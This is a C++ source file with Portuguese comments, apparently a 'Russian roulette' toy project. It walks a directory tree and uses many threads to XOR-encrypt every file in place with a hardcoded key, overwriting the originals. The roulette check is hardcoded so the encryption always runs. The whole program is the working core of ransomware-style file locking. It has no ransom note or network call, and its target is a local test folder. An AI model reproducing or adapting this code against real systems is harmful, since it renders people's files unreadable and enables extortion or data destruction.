#include <iostream> // IO
#include <ctime>
#include <cstdlib> // Acesso a funções do C
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <stdexcept>
#include <filesystem>
#include <random>
#include <thread>
#include <queue>

#define DIR_PATH "/home/jack/github/roleta-russa/testes"
#define CHAVE "19fa61d75522a4669b44e39c1d2e1726c530232130d407f89afee0964997f7a73e83be698b288febcf88e3e03c4f0757ea8964e59b63d93708b138cc42a66eb3"
#define MAX_OPEN_FILES 100

/**
 * Classe para criptografar e ler o conteúdo de um arquivo.
 */
class CriptografiaArquivo {
    public:
        /**
         * Criptografa o arquivo no caminho especificado usando a chave fornecida.
         * O arquivo original é substituído pelo arquivo criptografado.
         *
         * @param caminhoArquivo O caminho para o arquivo a ser criptografado.
         * @param chave A chave usada para criptografar o arquivo.
         * @throws std::runtime_error se não for possível abrir o arquivo para leitura
         *         ou o arquivo temporário para escrita.
         */
        void criptografarArquivo(const std::string& caminhoArquivo, const std::string& chave) {
            // Abre o arquivo original para leitura em modo binário
            std::ifstream arquivo(caminhoArquivo, std::ios::binary);
            if (!arquivo.is_open()) {
                throw std::runtime_error("Não foi possível abrir o arquivo para leitura");
            }

            // Abre o arquivo temporário para escrita em modo binário
            std::ofstream arquivoCriptografado(caminhoArquivo + ".temp", std::ios::binary);
            if (!arquivoCriptografado.is_open()) {
                arquivo.close();
                throw std::runtime_error("Não foi possível abrir o arquivo temporário para escrita");
            }

            // Obtém o tamanho da chave
            const size_t tamanhoChave = chave.size();

            // Define o tamanho do buffer de leitura/escrita
            constexpr size_t bufferSize = 8192;

            // Cria um buffer para armazenar os dados lidos
            std::vector<char> buffer(bufferSize);

            // Criptografa o arquivo em blocos
            size_t i = 0;
            while (arquivo.read(buffer.data(), bufferSize)) {
                for (size_t j = 0; j < bufferSize; ++j) {
                    buffer[j] ^= chave[i % tamanhoChave];
                    i++;
                }
                arquivoCriptografado.write(buffer.data(), bufferSize);
            }

            // Processa o último bloco parcial, se houver
            size_t bytesLidos = arquivo.gcount();
            for (size_t j = 0; j < bytesLidos; ++j) {
                buffer[j] ^= chave[i % tamanhoChave];
                i++;
            }
            arquivoCriptografado.write(buffer.data(), bytesLidos);

            // Fecha os arquivos
            arquivo.close();
            arquivoCriptografado.close();

            // Renomeia o arquivo temporário para substituir o arquivo original
            std::filesystem::rename(caminhoArquivo + ".temp", caminhoArquivo);
            std::cout << caminhoArquivo << std::endl;
        }

        /**
         * Lê o conteúdo do arquivo no caminho especificado e retorna como uma string.
         *
         * @param caminhoArquivo O caminho para o arquivo a ser lido.
         * @return O conteúdo do arquivo como uma string.
         * @throws std::runtime_error se não for possível abrir o arquivo para leitura.
         */
        static std::string lerConteudoArquivo(const std::string& caminhoArquivo) {
            // Abre o arquivo para leitura
            std::ifstream arquivo(caminhoArquivo, std::ios::binary);
            if (!arquivo.is_open()) {
                throw std::runtime_error("Não foi possível abrir o arquivo para leitura: " + caminhoArquivo);
            }

            // Lê o conteúdo do arquivo para um stringstream
            std::stringstream buffer;
            buffer << arquivo.rdbuf();
            arquivo.close();

            // Retorna o conteúdo do arquivo como uma string
            return buffer.str();
        }
};


/**
 * Classe para escanear um diretório e listar todos os arquivos encontrados.
 */
class DirectoryScanner {
    public:
        /**
         * Construtor padrão da classe `DirectoryScanner`.
         */
        DirectoryScanner() {}

        /**
         * Lista todos os arquivos encontrados no diretório especificado e seus subdiretórios.
         *
         * @param dir_path O caminho do diretório a ser escaneado.
         * @return Um vetor de strings contendo os caminhos completos de todos os arquivos encontrados.
         */
        std::vector<std::string> list_files(const std::string& dir_path) {
            std::vector<std::string> files; // Vetor para armazenar os caminhos completos dos arquivos
            std::mutex mutex; // Mutex para garantir exclusão mútua ao adicionar arquivos ao vetor
            std::queue<std::string> directories; // Fila para armazenar os subdiretórios a serem processados

            try {
                // Verifica se o diretório existe
                if (!std::filesystem::is_directory(dir_path)) {
                    std::cerr << "Diretório não encontrado: " << dir_path << std::endl;
                    return files;
                }

                directories.push(dir_path); // Adiciona o diretório raiz à fila de subdiretórios

                // Função lambda para processar um subdiretório
                auto process_directory = [&]() {
                    while (true) {
                        std::string directory;

                        {
                            std::lock_guard<std::mutex> lock(mutex);

                            if (directories.empty()) {
                                break; // Sai do loop se não houver mais subdiretórios para processar
                            }

                            directory = directories.front();
                            directories.pop();
                        }

                        for (const auto& entry : std::filesystem::directory_iterator(directory)) {
                            try {
                                if (entry.is_directory()) {
                                    std::lock_guard<std::mutex> lock(mutex);

                                    if (directories.size() < MAX_OPEN_FILES) {
                                        directories.push(entry.path().string()); // Adiciona o subdiretório à fila
                                    }
                                } else if (entry.is_regular_file()) {
                                    std::lock_guard<std::mutex> lock(mutex);
                                    files.push_back(entry.path().string()); // Adiciona o arquivo ao vetor
                                }
                            } catch (const std::filesystem::filesystem_error& e) {
                                std::cerr << "Erro ao acessar o diretório: " << e.what() << std::endl;
                            }
                        }
                    }
                };

                // Cria threads para processar diferentes subdiretórios em paralelo
                std::vector<std::thread> threads;
                for (int i = 0; i < MAX_OPEN_FILES; i++) {
                    threads.emplace_back(process_directory);
                }

                // Aguarda todas as threads terminarem
                for (auto& thread : threads) {
                    thread.join();
                }

                // Ordena o vetor de arquivos por tamanho
                std::sort(files.begin(), files.end(), [](const std::string& a, const std::string& b) {
                    return std::filesystem::file_size(a) < std::filesystem::file_size(b);
                });
            }
            catch (const std::filesystem::filesystem_error& e) {
                std::cerr << "Erro ao acessar o diretório: " << e.what() << std::endl;
            }
            catch (...) {
                std::cerr << "Erro desconhecido ao acessar o diretório." << std::endl;
            }

            return files; // Retorna o vetor de arquivos encontrados
        }
};


/**
 * Classe principal do programa.
 */
class Programa {
    private:
        CriptografiaArquivo ca;      // Objeto responsável pela criptografia de arquivos
        DirectoryScanner ds;        // Objeto responsável pela varredura de diretórios
        std::mutex mutex;           // Mutex para garantir exclusão mútua ao adicionar arquivos ao vetor

    public:
        /**
         * Construtor padrão da classe `Programa`.
         */
        Programa() {}

        /**
         * Gera um número aleatório entre o intervalo especificado.
         *
         * @param min O valor mínimo do intervalo.
         * @param max O valor máximo do intervalo.
         * @return Um número aleatório entre o intervalo especificado.
         */
        int gerarNumeroAleatorio(int min, int max) {
            std::random_device rd;             // Obtém uma seed aleatória do dispositivo do sistema
            std::mt19937 mt(rd());             // Inicializa o gerador de números aleatórios com a seed
            std::uniform_int_distribution<int> dist(min, max);    // Define a distribuição dos números

            return dist(mt);    // Gera e retorna um número aleatório
        }

        /**
         * Executa o programa.
         */
        void executar() {
            std::vector<std::string> files = ds.list_files(DIR_PATH);    // Obtém a lista de arquivos

            int numero_sorteado = 6;    // Número sorteado (exemplo)

            if (numero_sorteado == 6) {
                if (files.empty()) {
                    std::cout << "Nenhum arquivo encontrado." << std::endl;
                    return;
                }

                std::vector<std::thread> threads;
                threads.reserve(files.size()); // Pré-aloca espaço para os elementos do vetor threads

                // Cria uma thread para cada arquivo e criptografa em paralelo
                for (const auto& file : files) {
                    threads.emplace_back([&](const std::string& file) {
                        try {
                            ca.criptografarArquivo(file, CHAVE);
                        } catch (const std::exception& e) {
                            std::lock_guard<std::mutex> lock(mutex); // Adquire o mutex para exclusão mútua ao imprimir mensagens de erro
                            std::cerr << "Erro ao criptografar arquivo: " << e.what() << std::endl;
                        }
                    }, file);
                }

                // Aguarda todas as threads terminarem
                for (auto& thread : threads) {
                    thread.join();
                }
            }
        }
};


/**
 * Função principal do programa.
 * Cria um objeto da classe Programa e executa o programa.
 *
 * @return O valor de saída do programa.
 */
int main() {
    Programa p;     // Cria um objeto da classe Programa
    p.executar();   // Executa o programa
    return 0;       // Retorna 0 para indicar sucesso
}